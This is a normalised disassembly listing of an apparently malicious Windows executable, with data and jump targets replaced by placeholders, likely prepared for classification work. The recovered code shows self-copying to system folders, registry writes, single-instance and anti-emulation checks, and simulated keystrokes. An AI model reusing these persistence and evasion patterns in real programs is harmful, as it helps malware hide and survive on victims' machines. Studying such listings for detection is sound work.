lea eax [ ebp - 0x4 ]
push eax
mov edi 0xf003f
push edi
push ebx
push [ ebp + 0x8 ]
mov esi 0x80000001
push esi
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
lea esi [ eax + 0x1 ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push edi
push ebx
push r--data
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0xc ] 0x1
push esi
call [ ebp - 0x8 ]
test eax eax
jne r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax esi
push eax
push [ ebp + 0x10 ]
push 0x1
push ebx
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
call [ ebp - 0x10 ]
push [ ebp - 0x4 ]
mov esi eax
call [ RegCloseKey@IAT ]
xor eax eax
cmp esi ebx
sete al
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_2003211
push ebp
mov ebp esp
sub esp 0x308
push 0xff
lea eax [ ebp - 0xff ]
push 0x0
push eax
mov [ ebp - 0x100 ] 0x0
call sub_2013580
lea eax [ ebp - 0x100 ]
push r--data
push eax
call sub_200101f
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x308 ]
add esp 0x14
sub eax ecx
mov dl [ ecx ]
mov [ eax + ecx ] dl
inc ecx
test dl dl
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
lea eax [ ebp - 0x308 ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x100 ]
push eax
call sub_20030f6
add esp 0xc
leave
retn
mov eax [ ebp + 0x10 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
push esi
push edi
lea edi [ ebp - 0x308 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov eax [ ebp + 0x10 ]
mov esi r--data
movsw [ edi ] [ esi ]
mov edx eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ ebp - 0x308 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
sub_20032d6
push ebp
mov ebp esp
sub esp 0x780
push esi
lea edx [ ebp - 0x110 ]
push edi
sub edx eax
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
lea edi [ ebp - 0x110 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
lea eax [ ebp - 0x110 ]
movsw [ edi ] [ esi ]
call sub_2006620
mov edi 0x670
mov esi rw-data
test eax eax
je r-xdata
push edi
lea eax [ ebp - 0x780 ]
push esi
push eax
call sub_200109f
lea eax [ ebp - 0x780 ]
push eax
push ebx
call sub_200101f
lea eax [ ebp - 0x760 ]
push eax
lea eax [ ebx + 0x20 ]
push eax
call sub_200101f
lea eax [ ebp - 0x740 ]
push eax
lea eax [ ebx + 0x40 ]
push eax
call sub_200101f
mov ax [ ebp - 0x71e ]
mov [ ebx + 0x62 ] ax
mov ax [ ebp - 0x720 ]
mov [ ebx + 0x60 ] ax
mov ax [ ebp - 0x71c ]
mov [ ebx + 0x64 ] ax
lea eax [ ebp - 0x71a ]
push eax
lea eax [ ebx + 0x66 ]
push eax
call sub_200101f
lea eax [ ebp - 0x6fa ]
push eax
lea eax [ ebx + 0x86 ]
push eax
call sub_200101f
lea eax [ ebp - 0x6da ]
push eax
lea eax [ ebx + 0xa6 ]
push eax
call sub_200101f
mov al [ ebp - 0x6ba ]
add esp 0x3c
lea edi [ ebx + 0xc8 ]
mov ecx 0x16a
lea esi [ ebp - 0x6b8 ]
[ edi ] [ esi ]
pop edi
mov [ ebx + 0xc6 ] al
pop esi
leave
retn
lea eax [ ebp - 0x110 ]
push r--data
push eax
call sub_200a369
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
push eax
push edi
push 0x1
push esi
call sub_200a690
push [ ebp - 0x4 ]
call sub_200adb2
add esp 0x14
sub_2003409
push ebp
mov ebp esp
sub esp 0x784
push ebx
push esi
mov esi eax
push edi
mov ebx rw-data
test esi esi
je r-xdata
push 0x104
lea eax [ ebp - 0x110 ]
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
lea edi [ ebp - 0x110 ]
dec edi
lea edx [ eax + 0x1 ]
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
lea eax [ ebp - 0x110 ]
movsw [ edi ] [ esi ]
call sub_2006620
test eax eax
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
push 0x670
lea eax [ ebp - 0x780 ]
push ebx
push eax
call sub_200109f
add esp 0xc
xor eax eax
cmp [ ebp - 0x6ba ] al
pop edi
pop esi
setne al
pop ebx
leave
retn
lea eax [ ebp - 0x110 ]
push r--data
push eax
call sub_200a369
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax esi
sub edx esi
push esi
push 0x670
push 0x1
push ebx
call sub_200a690
push esi
call sub_200adb2
add esp 0x14
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
lea edi [ ebp - 0x110 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
lea eax [ ebp - 0x110 ]
movsw [ edi ] [ esi ]
call sub_2006620
test eax eax
je r-xdata
lea eax [ ebp - 0x110 ]
push r--data
push eax
call sub_200a369
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push 0x670
push 0x1
push ebx
call sub_200a690
push esi
call sub_200adb2
add esp 0x14
sub_2003525
push ebp
mov ebp esp
sub esp 0xc4
push ebx
call sub_2008290
test eax eax
jne r-xdata
xor eax eax
inc eax
call sub_2007dd0
test eax eax
jne r-xdata
call sub_2008620
test eax eax
jne r-xdata
xor ebx ebx
push 0x3f
lea eax [ ebp - 0x7f ]
push ebx
push eax
mov [ ebp - 0x80 ] bl
call sub_2013580
add esp 0xc
lea eax [ ebp - 0x80 ]
push r--data
push eax
call sub_200101f
push 0x3f
lea eax [ ebp - 0x3f ]
push ebx
push eax
mov [ ebp - 0x40 ] bl
call sub_2013580
add esp 0x14
lea eax [ ebp - 0x40 ]
push r--data
push eax
call sub_200101f
push 0x3f
lea eax [ ebp - 0xbf ]
push ebx
push eax
mov [ ebp - 0xc0 ] bl
call sub_2013580
add esp 0x14
lea eax [ ebp - 0xc0 ]
push r--data
push eax
call sub_200101f
lea eax [ ebp - 0x80 ]
push eax
call sub_2002032
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x40 ]
push eax
call sub_2002032
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0xc0 ]
push eax
call sub_2002032
pop ecx
test eax eax
je r-xdata
pop ebx
leave
retn
sub_20035f6
call sub_2007dd0
test eax eax
je r-xdata
call sub_2008160
test eax eax
jne r-xdata
xor eax eax
inc eax
retn
call sub_20085b0
neg eax
sbb eax eax
neg eax
retn
sub_2003618
push ebp
mov ebp esp
sub esp 0x18
push edi
xor eax eax
cmp [ ebp + 0x8 ] 0x0
mov [ ebp - 0x18 ] 0x0
lea edi [ ebp - 0x17 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jne r-xdata
push ebx
push esi
lea ecx [ ebp - 0x17 ]
lea esi [ ebp - 0x18 ]
sub esi edx
mov edi ecx
push 0x4
lea eax [ edx + 0x2 ]
sub edi edx
pop edx
mov [ ebp - 0x4 ] edx
or eax 0xffffffff
jmp r-xdata
mov bl [ eax - 0x2 ]
mov [ ecx - 0x1 ] bl
mov bl [ eax - 0x1 ]
mov [ ecx ] bl
mov bl [ eax ]
mov [ esi + eax ] bl
mov bl [ eax + 0x1 ]
mov [ edi + eax ] bl
add ecx edx
add eax edx
dec [ ebp - 0x4 ]
jne r-xdata
sub [ ebp + 0xc ] 0x10
xor eax eax
cmp [ ebp + 0xc ] eax
jle r-xdata
pop edi
leave
retn
pop esi
pop ebx
cmp eax [ ebp + 0xc ]
je r-xdata
mov esi [ ebp + 0x8 ]
add esi eax
mov ecx edx
lea edi [ ebp - 0x18 ]
xor ebx ebx
[ esi ] [ edi ]
je r-xdata
add eax 0x10
inc eax
cmp eax [ ebp + 0xc ]
jl r-xdata
sub_20036a4
push ebp
mov ebp esp
sub esp 0x210
push ebx
push esi
mov esi 0x104
xor ebx ebx
push esi
lea eax [ ebp - 0x107 ]
push ebx
push eax
mov [ ebp - 0x108 ] bl
call sub_2013580
push esi
lea eax [ ebp - 0x20f ]
push ebx
push eax
mov [ ebp - 0x210 ] bl
call sub_2013580
lea eax [ ebp - 0x108 ]
push r--data
push eax
call sub_200101f
add esp 0x20
lea eax [ ebp - 0x108 ]
push eax
call [ LoadLibraryA@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
pop esi
or eax 0xffffffff
pop ebx
leave
retn 0x4
lea eax [ ebp - 0x210 ]
push r--data
push eax
call sub_200101f
pop ecx
pop ecx
lea eax [ ebp - 0x210 ]
push eax
push esi
call [ GetProcAddress@IAT ]
mov esi eax
cmp esi ebx
jne r-xdata
push r--data
push ebx
call [ FindWindowA@IAT ]
cmp eax ebx
je r-xdata
push 0x5
call [ Sleep@IAT ]
jmp r-xdata
push eax
call [ SetForegroundWindow@IAT ]
push ebx
push ebx
push ebx
push 0x1b
call esi
push ebx
push 0x2
push ebx
push 0x1b
call esi
sub_200376b
push ebp
mov ebp esp
sub esp 0x30
xor eax eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x30 ]
push eax
mov [ ebp - 0x30 ] 0x30
mov [ ebp - 0x2c ] 0x3
mov [ ebp - 0x28 ] DefWindowProcA
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x10 ] 0x6
mov [ ebp - 0x8 ] r--data
call [ RegisterClassExA@IAT ]
leave
retn
sub_20037b7
push 0x0
push eax
push 0x0
push 0x0
push 0xa
push 0xa
mov [ rw-data ] eax
mov eax 0xfffffe0c
push eax
push eax
push 0xcf0000
push r--data
push r--data
push 0x80
call [ CreateWindowExA@IAT ]
mov [ rw-data ] eax
test eax eax
jne r-xdata
push [ esp + 0x4 ]
push eax
call [ ShowWindow@IAT ]
push [ rw-data ]
call [ UpdateWindow@IAT ]
xor eax eax
inc eax
retn
retn
sub_200380d
push ebp
mov ebp esp
sub esp 0x160
push ebx
push esi
push edi
mov esi 0x103
xor ebx ebx
push esi
lea eax [ ebp - 0x15f ]
push ebx
push eax
mov [ ebp - 0x160 ] bl
call sub_2013580
push 0x44
pop edi
push edi
lea eax [ ebp - 0x5c ]
push ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_2013580
xor eax eax
mov [ ebp - 0x5c ] edi
mov [ ebp - 0x2c ] ax
lea edi [ ebp - 0x18 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0x160 ]
push r--data
push eax
mov [ ebp - 0x30 ] 0x1
call sub_200101f
mov edi [ GetTickCount@IAT ]
add esp 0x20
call edi
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x5c ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x160 ]
push eax
push ebx
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ebx [ GetExitCodeProcess@IAT ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x18 ]
call ebx
cmp [ ebp - 0x4 ] esi
je r-xdata
push 0x1f4
call [ Sleep@IAT ]
call edi
sub eax [ ebp - 0x8 ]
mov ecx 0x7c6
cmp ecx eax
sbb eax eax
neg eax
sub_20038d1
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xe0c
push ebx
push esi
push edi
push 0xa
xor eax eax
xor ebx ebx
pop ecx
lea edi [ esp + 0x14d ]
mov [ esp + 0x14c ] bl
[ edi ]
mov [ esp + 0x2c ] bl
lea edi [ esp + 0x2d ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov esi 0x103
push esi
stosd [ edi ]
lea eax [ esp + 0x17d ]
push ebx
push eax
mov [ esp + 0x184 ] bl
call sub_2013580
add esp 0xc
push esi
lea eax [ esp + 0x495 ]
push ebx
push eax
mov [ esp + 0x49c ] bl
call sub_2013580
add esp 0xc
push esi
lea eax [ esp + 0x45 ]
push ebx
push eax
mov [ esp + 0x4c ] bl
call sub_2013580
add esp 0xc
push esi
lea eax [ esp + 0x285 ]
push ebx
push eax
mov [ esp + 0x28c ] bl
call sub_2013580
add esp 0xc
mov [ esp + 0x18 ] ebx
mov [ esp + 0x10 ] ebx
mov [ esp + 0x24 ] ebx
call sub_200431a
test eax eax
jne r-xdata
xor eax eax
call sub_2004278
test eax eax
je r-xdata
push ebx
call sub_200b148
pop ecx
push eax
call sub_200a6ad
mov esi [ ebp + 0x10 ]
pop ecx
cmp esi ebx
je r-xdata
mov [ esp + 0x40 ] bl
mov eax esi
lea edx [ eax + 0x1 ]
cmp esi ebx
je r-xdata
call sub_200411a
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
je r-xdata
mov esi 0x104
push esi
lea eax [ esp + 0x59d ]
push ebx
push eax
mov [ esp + 0x5a4 ] bl
call sub_2013580
add esp 0xc
push esi
lea eax [ esp + 0x6a5 ]
push ebx
push eax
mov [ esp + 0x6ac ] bl
call sub_2013580
add esp 0xc
lea eax [ esp + 0x598 ]
push r--data
push eax
call sub_200101f
lea eax [ esp + 0x6a8 ]
push r--data
push eax
call sub_200101f
add esp 0x10
lea eax [ esp + 0x6a0 ]
push eax
call [ GetModuleHandleA@IAT ]
lea ecx [ esp + 0x598 ]
push ecx
push eax
call [ GetProcAddress@IAT ]
mov edi eax
lea eax [ esp + 0x40 ]
push r--data
push eax
call sub_200101f
pop ecx
pop ecx
lea eax [ esp + 0x40 ]
push eax
push ebx
push ebx
call edi
mov [ esp + 0x10 ] eax
cmp eax ebx
je r-xdata
mov eax esi
lea edx [ eax + 0x1 ]
lea edx [ esp + 0x40 ]
mov eax esi
sub edx esi
push esi
call [ GetLastError@IAT ]
cmp eax 0xb7
jne r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
je r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
jmp r-xdata
lea ebx [ esp + 0x178 ]
call sub_2007530
lea edx [ esp + 0x490 ]
lea eax [ esp + 0x40 ]
push rw-data
push eax
call sub_200101f
lea eax [ esp + 0x48 ]
push eax
call sub_2002032
add esp 0xc
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x40 ]
push rw-data
push eax
call sub_200101f
lea eax [ esp + 0x48 ]
push eax
call sub_2002032
add esp 0xc
mov [ esp + 0x20 ] eax
lea eax [ esp + 0x40 ]
push rw-data
push eax
call sub_200101f
lea eax [ esp + 0x48 ]
push eax
call sub_2002032
add esp 0xc
mov [ esp + 0x18 ] eax
lea eax [ esp + 0x40 ]
push rw-data
push eax
call sub_200101f
lea eax [ esp + 0x48 ]
push eax
call sub_2002032
add esp 0xc
mov [ esp + 0x28 ] eax
lea eax [ esp + 0x40 ]
push rw-data
push eax
call sub_200101f
lea eax [ esp + 0x48 ]
push eax
call sub_2002032
add esp 0xc
mov [ esp + 0xc ] eax
lea eax [ esp + 0x40 ]
push rw-data
push eax
call sub_200101f
lea eax [ esp + 0x48 ]
push eax
call sub_2002032
add esp 0xc
mov edi eax
lea eax [ esp + 0x40 ]
push rw-data
push eax
call sub_200101f
lea eax [ esp + 0x48 ]
push eax
call sub_2002032
add esp 0xc
lea eax [ esp + 0x40 ]
push rw-data
push eax
call sub_200101f
lea eax [ esp + 0x48 ]
push eax
call sub_2002032
add esp 0xc
mov [ esp + 0x1c ] eax
cmp [ esp + 0xc ] ebx
jne r-xdata
push [ esp + 0x10 ]
call [ CloseHandle@IAT ]
lea eax [ esp + 0x40 ]
push r--data
push eax
call sub_200101f
lea eax [ esp + 0x48 ]
push eax
push esi
call sub_2009b94
add esp 0x10
test eax eax
jne r-xdata
call sub_20040dc
test eax eax
je r-xdata
mov cl [ eax ]
inc eax
mov [ edx ] cl
inc edx
test cl cl
jne r-xdata
xor edi edi
cmp [ esp + 0x18 ] edi
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_200376b
push [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
call sub_20037b7
pop ecx
test eax eax
je r-xdata
cmp [ esp + 0x20 ] ebx
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
lea edx [ esp + 0x178 ]
mov eax esi
sub edx esi
push 0x104
jmp r-xdata
lea eax [ esp + 0x178 ]
push r--data
push eax
call sub_200a369
mov esi eax
pop ecx
pop ecx
cmp esi edi
je r-xdata
cmp [ esp + 0x24 ] edi
je r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push ebx
push ebx
push sub_20036a4
push ebx
push ebx
call [ CreateThread@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
cmp edi ebx
je r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
xor eax eax
inc eax
mov [ esp + 0x18 ] eax
mov [ esp + 0x24 ] eax
jmp r-xdata
lea eax [ esp + 0x17c ]
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
push [ esp + 0x10 ]
call [ CloseHandle@IAT ]
push 0x2
push edi
push esi
call sub_200b0c3
add esp 0xc
push esi
call sub_200afcb
pop ecx
push edi
push edi
push esi
mov ebx eax
call sub_200b0c3
add esp 0xc
push ebx
call sub_2009eef
pop ecx
mov [ esp + 0x1c ] eax
cmp eax edi
jne r-xdata
call sub_200465f
movzx eax ax
mov [ esp + 0x14 ] eax
mov [ esp + 0x14 ] 0x1
jmp r-xdata
push ebx
push r--data
push ebx
push ebx
call [ MessageBoxA@IAT ]
push 0x1e
call [ Sleep@IAT ]
push 0xffffffff
push esi
call [ TerminateThread@IAT ]
cmp [ esp + 0x20 ] ebx
jne r-xdata
lea eax [ esp + 0x40 ]
push r--data
push eax
call sub_200101f
lea eax [ esp + 0x48 ]
push eax
lea eax [ esp + 0x184 ]
push eax
lea eax [ esp + 0x4a0 ]
push eax
call sub_2003211
add esp 0x14
test eax eax
jne r-xdata
mov [ esp + 0x14 ] ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0xc ] ebx
cmp [ esp + 0x24 ] ebx
jne r-xdata
push esi
push ebx
push 0x1
push eax
call sub_200a690
add esp 0x10
cmp eax ebx
jne r-xdata
push [ esp + 0x10 ]
call [ CloseHandle@IAT ]
push esi
call sub_200adb2
pop ecx
jmp r-xdata
lea eax [ esp + 0x14c ]
push 0x0
push eax
lea ebx [ esp + 0x34 ]
mov [ esp + 0x154 ] 0x0
call sub_20016f5
sub esp 0x668
mov edi esp
mov eax ebx
push eax
lea eax [ esp + 0x7c0 ]
mov ecx 0x19c
lea esi [ esp + 0xe1c ]
push eax
[ edi ] [ esi ]
call sub_2002754
add esp 0x678
test ax ax
jl r-xdata
lea eax [ esp + 0x178 ]
lea ebx [ esp + 0x7a8 ]
call sub_20032d6
sub esp 0x670
mov ecx 0x19c
mov esi ebx
mov edi esp
[ edi ] [ esi ]
call sub_2002439
add esp 0x670
cmp [ esp + 0x14 ] 0x1
jne r-xdata
mov [ esp + 0x18 ] ebx
cmp [ esp + 0x18 ] ebx
jne r-xdata
push esi
call sub_200adb2
mov ebx [ GetSystemDirectoryA@IAT ]
pop ecx
cmp [ esp + 0xc ] edi
je r-xdata
lea eax [ esp + 0x40 ]
push rw-data
push eax
call sub_200101f
lea eax [ esp + 0x48 ]
push eax
call sub_2002032
add esp 0xc
test eax eax
jne r-xdata
lea eax [ esp + 0x178 ]
call sub_2002dfc
jmp r-xdata
lea eax [ esp + 0x178 ]
call sub_2002dfc
jmp r-xdata
cmp [ esp + 0x28 ] ebx
jne r-xdata
cmp [ esp + 0x14 ] edi
jne r-xdata
lea eax [ esp + 0x280 ]
push r--data
push eax
call sub_200101f
pop ecx
pop ecx
push 0x104
lea eax [ esp + 0x44 ]
push eax
call ebx
lea eax [ esp + 0x280 ]
mov edx eax
cmp [ esp + 0x10 ] 0x0
je r-xdata
cmp [ esp + 0x20 ] eax
jne r-xdata
cmp [ esp + 0x14 ] ebx
jne r-xdata
push 0x104
lea eax [ esp + 0x38d ]
push edi
push eax
mov [ esp + 0x394 ] 0x0
call sub_2013580
add esp 0xc
mov esi 0x105
push esi
lea eax [ esp + 0x38c ]
push eax
push r--data
call [ ExpandEnvironmentStringsA@IAT ]
test eax eax
jbe r-xdata
cmp [ esp + 0x20 ] edi
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ esp + 0x40 ]
sub eax edx
dec edi
lea eax [ esp + 0x40 ]
push r--data
push eax
call sub_200101f
lea eax [ esp + 0x48 ]
push eax
lea eax [ esp + 0x184 ]
push eax
lea eax [ esp + 0x4a0 ]
push eax
call sub_2003211
add esp 0x14
jmp r-xdata
cmp [ esp + 0xc ] ebx
jne r-xdata
lea eax [ esp + 0x40 ]
push eax
call sub_2001edb
pop ecx
lea eax [ esp + 0x40 ]
push 0x5c
push eax
call sub_200a930
pop ecx
pop ecx
cmp eax edi
je r-xdata
lea eax [ esp + 0x40 ]
push eax
call sub_2001edb
pop ecx
jmp r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov [ esp + 0x18 ] 0x1
cmp [ esp + 0x1c ] ebx
je r-xdata
inc eax
push eax
lea eax [ esp + 0x38c ]
push esi
push eax
call sub_200acc7
add esp 0xc
push edi
lea eax [ esp + 0x38c ]
push eax
lea eax [ esp + 0x48 ]
push eax
call [ CopyFileA@IAT ]
test eax eax
je r-xdata
and [ esp + 0xc ] 0x0
call sub_2003525
test eax eax
je r-xdata
lea eax [ esp + 0x388 ]
push eax
lea eax [ esp + 0x44 ]
push 0x104
push eax
call sub_200a6e1
add esp 0xc
push 0x3e8
call [ Sleep@IAT ]
inc [ esp + 0xc ]
cmp [ esp + 0xc ] 0x1
lea eax [ esp + 0x280 ]
jne r-xdata
push r--data
push eax
call sub_200101f
pop ecx
pop ecx
push 0x104
lea eax [ esp + 0x44 ]
push eax
call ebx
lea eax [ esp + 0x280 ]
mov edx eax
push r--data
push eax
call sub_200101f
pop ecx
pop ecx
push 0x104
lea eax [ esp + 0x44 ]
push eax
call ebx
lea eax [ esp + 0x280 ]
mov edx eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ esp + 0x40 ]
sub eax edx
dec edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ esp + 0x40 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
cmp [ esp + 0xc ] 0x3
[ edi ] [ esi ]
jl r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
lea eax [ esp + 0x178 ]
push eax
push [ esp + 0x20 ]
lea eax [ esp + 0x48 ]
push eax
call sub_2001a1b
add esp 0xc
test eax eax
jne r-xdata
sub_20040dc
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push r--data
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
lea eax [ ebp - 0x4 ]
push eax
call [ GetCurrentProcess@IAT ]
push eax
call [ rw-data ]
sub_200411a
push ebp
mov ebp esp
sub esp 0x494
push ebx
push esi
push edi
xor ebx ebx
push 0x103
lea eax [ ebp - 0x17f ]
push ebx
push eax
mov [ ebp - 0x180 ] bl
call sub_2013580
add esp 0xc
push 0x104
lea eax [ ebp - 0x490 ]
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
xor eax eax
mov cl [ ebp + eax - 0x490 ]
mov [ ebp + eax - 0x388 ] cl
inc eax
cmp cl bl
jne r-xdata
lea eax [ ebp - 0x388 ]
push 0x5c
push eax
call sub_200a930
mov [ eax ] bl
lea eax [ ebp - 0x180 ]
push r--data
push eax
call sub_200101f
lea eax [ ebp - 0x180 ]
add esp 0x10
mov edx eax
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
lea edi [ ebp - 0x388 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
push 0x7
xor eax eax
mov [ ebp - 0x30 ] bl
pop ecx
lea edi [ ebp - 0x2f ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x30 ]
push r--data
push eax
call sub_200101f
lea eax [ ebp - 0x388 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_20043b8
add esp 0x10
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x44
pop esi
push esi
lea eax [ ebp - 0x78 ]
push ebx
push eax
call sub_2013580
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
lea edi [ ebp - 0x388 ]
add esp 0xc
mov [ ebp - 0x78 ] esi
dec edi
mov al [ edi + 0x1 ]
inc edi
cmp al bl
jne r-xdata
mov esi r--data
lea eax [ ebp - 0x490 ]
movsw [ edi ] [ esi ]
mov edx eax
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
lea edi [ ebp - 0x388 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x388 ]
push eax
and ecx 0x3
push ebx
[ edi ] [ esi ]
call [ CreateProcessA@IAT ]
sub_2004278
push ebp
mov ebp esp
sub esp 0x164
push ebx
push esi
push edi
push 0x44
pop esi
push esi
xor ebx ebx
lea eax [ ebp - 0x58 ]
push ebx
push eax
call sub_2013580
add esp 0xc
push 0x5
pop eax
mov [ ebp - 0x28 ] ax
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
push 0x104
lea eax [ ebp - 0x160 ]
push eax
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x2c ] 0x1
call [ GetSystemDirectoryA@IAT ]
mov edi [ lstrlenA@IAT ]
lea eax [ ebp - 0x160 ]
lea esi [ ebp - 0x160 ]
push eax
dec esi
call edi
cmp [ eax + esi ] 0x5c
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x160 ]
push eax
call [ CreateProcessA@IAT ]
call [ GetLastError@IAT ]
sub eax 0x5
neg eax
pop edi
sbb eax eax
pop esi
inc eax
pop ebx
leave
retn
lea eax [ ebp - 0x160 ]
push eax
call edi
mov [ eax + esi ] bl
sub_200431a
push ebp
lea ebp [ esp - 0x78 ]
sub esp 0x4a0
push esi
push 0x4f
lea eax [ ebp - 0x27 ]
push 0x0
push eax
mov [ ebp - 0x28 ] 0x0
call sub_2013580
push 0x4f
lea eax [ ebp + 0x29 ]
push 0x0
push eax
mov [ ebp + 0x28 ] 0x0
call sub_2013580
add esp 0x18
xor esi esi
call sub_200a6bf
cdq
push 0x19
pop ecx
idiv ecx
add dl 0x41
mov [ ebp + esi - 0x28 ] dl
call sub_200a6bf
push 0x19
cdq
pop ecx
idiv ecx
add dl 0x41
mov [ ebp + esi + 0x28 ] dl
inc esi
cmp esi 0x4f
jb r-xdata
lea eax [ ebp + 0x28 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call [ SetEnvironmentVariableA@IAT ]
push 0x400
lea eax [ ebp - 0x428 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call [ GetEnvironmentVariableA@IAT ]
lea eax [ ebp + 0x28 ]
push eax
lea eax [ ebp - 0x428 ]
push eax
call [ lstrcmpA@IAT ]
neg eax
sbb eax eax
neg eax
pop esi
add ebp 0x78
leave
retn
sub_20043b8
push ebp
mov ebp esp
sub esp 0x324
push ebx
push esi
push edi
xor ebx ebx
push 0x103
lea eax [ ebp - 0x323 ]
push ebx
push eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x324 ] bl
call sub_2013580
mov esi 0x104
push esi
lea eax [ ebp - 0x21f ]
push ebx
push eax
mov [ ebp - 0x220 ] bl
call sub_2013580
